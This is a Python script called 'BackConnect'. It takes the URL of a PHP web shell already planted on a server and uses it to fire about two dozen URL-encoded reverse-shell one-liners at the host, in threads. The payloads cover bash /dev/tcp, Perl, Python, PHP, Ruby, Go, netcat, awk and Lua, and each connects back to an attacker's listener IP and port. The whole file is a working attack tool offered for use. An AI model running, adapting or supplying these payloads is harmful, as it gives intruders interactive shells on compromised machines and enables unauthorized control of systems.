#!/usr/bin/python3
import sys
import argparse
import requests
import urllib.parse
from threading import Lock
from multiprocessing.pool import ThreadPool


class BackConnect:
    thread_lock = Lock()

    def __init__(self):
        self.base_url = None
        self.listen_host = None
        self.listen_port = None

    @staticmethod
    def send_payload_threaded(data):
        payload_name = data[0]
        payload_url = data[1]

        with BackConnect.thread_lock:
            print(f'[+] Sending payload: {payload_name}', flush=True)

        try:
            requests.get(payload_url, timeout=3)
        except:
            # An exception is thrown when we timeout, however the timeout typically only happens when our
            # listener is triggered.
            print(f'[+] Success! It appears as though the {payload_name} payload has triggered the listener.')

    def run(self):
        self.print_header()
        args = self.parse_params()
        payloads = self.get_payloads().keys()

        if args.payloads:
            payloads = args.payloads.split(',')

        self.execute_payloads(payloads)

    def parse_params(self):
        parser = argparse.ArgumentParser(description='Use to pipe a terminal shell back to a netcat listener '
                                                     'via a simple PHP shell.')
        parser.add_argument('-i', '--ip', help='The listener IP address, this is typically your IP address.')
        parser.add_argument('-p', '--port', help='The listener port.')
        parser.add_argument('-u', '--url', help='The command shell URL including the query parameter. '
                                                '(e.g. http://example/cmd.php?cmd=)')
        parser.add_argument('--list', help='Lists all the available payloads.', action='store_true')
        parser.add_argument('--view', help='View a specific payload, use --list to view the different payload options.')
        parser.add_argument('--payloads', help='Comma separated list of payloads to send, use --list to view '
                                               'available payloads. If no payloads are specified all of the available'
                                               ' payloads are attempted.')
        args = parser.parse_args()

        self.listen_host = args.ip or None
        self.listen_port = args.port or None

        if args.list:
            self.list_payloads()

        if args.view:
            self.print_payload(args.view)

        if args.ip is None or args.port is None or args.url is None:
            parser.error('The arguments --ip, --port and --url are required.')

        self.base_url = args.url

        return args

    def execute_payloads(self, payloads):
        available_payloads = self.get_payloads()
        print('[*] Creating payloads...')
        payload_data = []

        for payload_slug in payloads:
            if payload_slug not in available_payloads:
                print(f'[!] Skipping {payload_slug} as it appears to be an invalid payload?')
                continue

            payload = available_payloads[payload_slug]
            payload = payload.replace('LHOST', self.listen_host)
            payload = payload.replace('LPORT', self.listen_port)
            payload_data.append((payload_slug, f"{self.base_url}{payload}"))

        thread_pool = ThreadPool(int(10))
        thread_pool.map(self.send_payload_threaded, payload_data)

        thread_pool.close()
        thread_pool.join()

    def print_payload(self, payload):
        print(f'[*] Outputting payload: {payload}')
        payloads = self.get_payloads()

        if payload not in payloads:
            print(f"[!] Cannot view this payload as it doesn't seem to be valid?")
            sys.exit(1)

        output = urllib.parse.unquote(payloads[payload])

        if self.listen_host is not None:
            output = output.replace('LHOST', self.listen_host)

        if self.listen_port is not None:
            output = output.replace('LPORT', self.listen_port)

        print(output)
        sys.exit(0)

    def list_payloads(self):
        print('[*] Available payloads:')

        for key in self.get_payloads().keys():
            print(f'\t[+] {key}')

        sys.exit(0)

    # URL encoded to avoid escaping characters
    def get_payloads(self):
        return {
            'bash_tcp_1': 'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FLHOST%2FLPORT%200%3E%261',
            'bash_tcp_2': '0%3C%26196%3Bexec%20196%3C%3E%2Fdev%2Ftcp%2FLHOST%2FLPORT%3B%20sh%20%3C%26196%20%3E%26196%202%3E%26196',
            'bash_udp': 'sh%20-i%20%3E%26%20%2Fdev%2Fudp%2FLHOST%2FLPORT%200%3E%261',
            'perl_1': 'perl%20-e%20%27use%20Socket%3B%24i%3D%22LHOST%22%3B%24p%3DLPORT%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27',
            'perl_2': 'perl%20-MIO%20-e%20%27%24p%3Dfork%3Bexit%2Cif%28%24p%29%3B%24c%3Dnew%20IO%3A%3ASocket%3A%3AINET%28PeerAddr%2C%22LHOST%3ALPORT%22%29%3BSTDIN-%3Efdopen%28%24c%2Cr%29%3B%24~-%3Efdopen%28%24c%2Cw%29%3Bsystem%24_%20while%3C%3E%3B%27',
            'python_1': 'export%20RHOST%3D%22LHOST%22%3Bexport%20RPORT%3DLPORT%3Bpython%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fsh%22%29%27',
            'python_2': 'python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22LHOST%22%2CLPORT%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27',
            'php_1': 'php%20-r%20%27%24sock%3Dfsockopen%28%22LHOST%22%2CLPORT%29%3B%24proc%3Dproc_open%28%22%2Fbin%2Fsh%20-i%22%2C%20array%280%3D%3E%24sock%2C%201%3D%3E%24sock%2C%202%3D%3E%24sock%29%2C%24pipes%29%3B%27',
            'php_2': 'php%20-r%20%27%24sock%3Dfsockopen%28%22LHOST%22%2CLPORT%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27',
            'php_3': 'php%20-r%20%27%24sock%3Dfsockopen%28%22LHOST%22%2CLPORT%29%3Bshell_exec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27',
            'php_4': 'php%20-r%20%27%24sock%3Dfsockopen%28%22LHOST%22%2CLPORT%29%3B%60%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%60%3B%27',
            'php_5': 'php%20-r%20%27%24sock%3Dfsockopen%28%22LHOST%22%2CLPORT%29%3Bsystem%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27',
            'php_6': 'php%20-r%20%27%24sock%3Dfsockopen%28%22LHOST%22%2CLPORT%29%3Bpassthru%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27',
            'php_7': 'php%20-r%20%27%24sock%3Dfsockopen%28%22LHOST%22%2CLPORT%29%3Bpopen%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%2C%20%22r%22%29%3B%27',
            'ruby_1': 'ruby%20-rsocket%20-e%27f%3DTCPSocket.open%28%22LHOST%22%2CLPORT%29.to_i%3Bexec%20sprintf%28%22%2Fbin%2Fsh%20-i%20%3C%26%25d%20%3E%26%25d%202%3E%26%25d%22%2Cf%2Cf%2Cf%29%27',
            'ruby_2': 'ruby%20-rsocket%20-e%20%27exit%20if%20fork%3Bc%3DTCPSocket.new%28%22LHOST%22%2C%22LPORT%22%29%3Bwhile%28cmd%3Dc.gets%29%3BIO.popen%28cmd%2C%22r%22%29%7B%7Cio%7Cc.print%20io.read%7Dend%27',
            'golang': 'echo%20%27package%20main%3Bimport%22os%2Fexec%22%3Bimport%22net%22%3Bfunc%20main%28%29%7Bc%2C_%3A%3Dnet.Dial%28%22tcp%22%2C%22LHOST%3ALPORT%22%29%3Bcmd%3A%3Dexec.Command%28%22%2Fbin%2Fsh%22%29%3Bcmd.Stdin%3Dc%3Bcmd.Stdout%3Dc%3Bcmd.Stderr%3Dc%3Bcmd.Run%28%29%7D%27%20%3E%20%2Ftmp%2Ft.go%20%26%26%20go%20run%20%2Ftmp%2Ft.go%20%26%26%20rm%20%2Ftmp%2Ft.go',
            'netcat_1': 'nc%20-e%20%2Fbin%2Fsh%20LHOST%20LPORT',
            'netcat_2': 'nc%20-e%20%2Fbin%2Fbash%20LHOST%20LPORT',
            'netcat_3': 'nc%20-c%20bash%20LHOST%20LPORT',
            'netcat_openbsd': 'rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20LHOST%20LPORT%20%3E%2Ftmp%2Ff',
            'awk': 'awk%20%27BEGIN%20%7Bs%20%3D%20%22%2Finet%2Ftcp%2F0%2FLHOST%2FLPORT%22%3B%20while%2842%29%20%7B%20do%7B%20printf%20%22shell%3E%22%20%7C%26%20s%3B%20s%20%7C%26%20getline%20c%3B%20if%28c%29%7B%20while%20%28%28c%20%7C%26%20getline%29%20%3E%200%29%20print%20%240%20%7C%26%20s%3B%20close%28c%29%3B%20%7D%20%7D%20while%28c%20%21%3D%20%22exit%22%29%20close%28s%29%3B%20%7D%7D%27%20%2Fdev%2Fnull',
            'lua_1': 'lua%20-e%20%22require%28%27socket%27%29%3Brequire%28%27os%27%29%3Bt%3Dsocket.tcp%28%29%3Bt%3Aconnect%28%27LHOST%27%2C%27LPORT%27%29%3Bos.execute%28%27%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%27%29%3B%22',
            'lua_2': 'lua5.1%20-e%20%27local%20host%2C%20port%20%3D%20%22LHOST%22%2C%20LPORT%20local%20socket%20%3D%20require%28%22socket%22%29%20local%20tcp%20%3D%20socket.tcp%28%29%20local%20io%20%3D%20require%28%22io%22%29%20tcp%3Aconnect%28host%2C%20port%29%3B%20while%20true%20do%20local%20cmd%2C%20status%2C%20partial%20%3D%20tcp%3Areceive%28%29%20local%20f%20%3D%20io.popen%28cmd%2C%20%22r%22%29%20local%20s%20%3D%20f%3Aread%28%22%2Aa%22%29%20f%3Aclose%28%29%20tcp%3Asend%28s%29%20if%20status%20%3D%3D%20%22closed%22%20then%20break%20end%20end%20tcp%3Aclose%28%29%27'
        }

    def print_header(self):
        print(
        """
 _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ 
| __  |  _  |     |  |  |     |     |   | |   | |   __|     |_   _|
| __ -|     |   --|    -|   --|  |  | | | | | | |   __|   --| | |  
|_____|__|__|_____|__|__|_____|_____|_|___|_|___|_____|_____| |_|  
-------------------------------------------------------------------
\t* Ensure your listener is running *
-------------------------------------------------------------------
        """)


if __name__ == '__main__':
    backconnect = BackConnect()
    backconnect.run()
